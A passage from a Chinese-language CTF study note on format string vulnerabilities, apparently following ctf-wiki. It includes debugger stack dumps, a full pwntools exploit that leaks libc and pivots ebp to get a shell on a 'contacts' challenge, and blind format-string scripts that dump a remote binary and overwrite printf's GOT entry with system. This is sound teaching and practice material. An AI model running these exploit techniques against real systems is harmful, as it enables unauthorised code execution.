0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740 \u00b6 \u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [ system_addr ][ bbbb ][ binsh_addr ][ %6 $p ][ %11 $p ][ bbbb ] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo \u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [ %6 $p ][ %11 $p ][ ccc ][ system_addr ][ bbbb ][ binsh_addr ][ dddd ] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b \u4fee\u6539 ebp \u00b6 \u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' \u83b7\u53d6 shell \u00b6 \u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002 \u5229\u7528\u7a0b\u5e8f \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context . log_level = 'debug' p = process ( \"./contacts\" ) elf = ELF ( \"./contacts\" ) #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF ( \"./libc.so\" ) def creat ( name , number , length , description ): p . sendlineafter ( \">>> \" , '1' ) p . sendlineafter ( \"Name: \" , name ) p . sendlineafter ( \"No: \" , number ) p . sendlineafter ( \"description: \" , str ( length )) p . sendlineafter ( \"description: \\n \" , description ) def free ( name ): p . sendlineafter ( \">>> \" , '2' ) p . sendlineafter ( \"remove? \" , name ) def edit ( name , choose , newname = 'skye' , length = 10 , description = 'skye' ): p . sendlineafter ( \">>> \" , '3' ) p . sendlineafter ( \"change? \" , name ) p . sendlineafter ( \">>> \" , str ( choose )) if ( choose == 1 ): p . sendlineafter ( \"name: \" , newname ) elif ( choose == 2 ): p . sendlineafter ( \"description: \" , str ( length )) p . sendlineafter ( \"Description: \\n \" , description ) def show (): p . sendlineafter ( \">>> \" , '4' ) # leak libc creat ( \"skye\" , \"skye\" , 24 , 'a' * 4 + \"%31$p\" ) show () p . recvuntil ( 'a' * 4 ) libc_start_main = int ( p . recv ( 10 ), 16 ) log . info ( \"libc_start_main:\" + hex ( libc_start_main )) libc_base = libc_start_main - 0x18637 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) binsh_addr = libc_base + libc . search ( 'sh \\x00 ' ) . next () log . info ( \"binsh_addr:\" + hex ( binsh_addr )) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32 ( system_addr ) + 'bbbb' + p32 ( binsh_addr ) + '%6$p%11$pcccc' creat ( '2222' , 'skye' , 0x20 , payload ) show () p . recvuntil ( 'Description: ' ) data = p . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) ebp_addr = int ( data [ - 2 ], 16 ) log . info ( \"ebp_addr:\" + hex ( ebp_addr )) heap_addr = int ( data [ - 1 ], 16 ) log . info ( \"heap_addr:\" + hex ( heap_addr )) # overwrite main_ebp payload = '% {} c%6$n' . format ( str ( heap_addr - 4 )) creat ( '3333' , 'skye' , 68 , payload ) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show () #getshell p . recvuntil ( '>>> ' ) p . sendline ( '5' ) p . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ \u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u00b6 ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u539f\u7406 \u00b6 \u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002 \u4f8b\u5b50 1 - \u6cc4\u9732\u6808 \u00b6 \u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u00b6 \u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528 \u00b6 \u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '% {} $p' . format ( i ) leak ( payload ) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { thi s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00 \u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got \u00b6 \u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u00b6 \u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002 \u786e\u5b9a\u504f\u79fb \u00b6 \u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002 \u6cc4\u9732 binary \u00b6 \u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () getbinary () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002 \u5206\u6790 binary \u00b6 \u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [ rbp-80h ] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [ rbp-80h ] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 **\u6ce8\u89e3\uff1a**\u8865\u5145\u4e00\u5f20\u56fe \u5229\u7528\u601d\u8def \u00b6 \u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell \u5229\u7528\u7a0b\u5e8f \u00b6 \u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context . arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote ( ip , port ) ## let the read get resolved sh . sendline ( 'a' ) sh . recv () ## get printf addr payload = '%00008$s' + 'STARTEND' + p64 ( read_got ) sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) . ljust ( 8 , ' \\x00 ' ) sh . recv () read_addr = u64 ( data ) ## get system addr libc = LibcSearcher ( 'read' , read_addr ) libc_base = read_addr - libc . dump ( 'read' ) system_addr = libc_base + libc . dump ( 'system' ) log . success ( 'system addr: ' + hex ( system_addr )) log . success ( 'read addr: ' + hex ( read_addr )) ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () ## get shell sh . sendline ( '/bin/sh;' ) sh . interactive () \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = 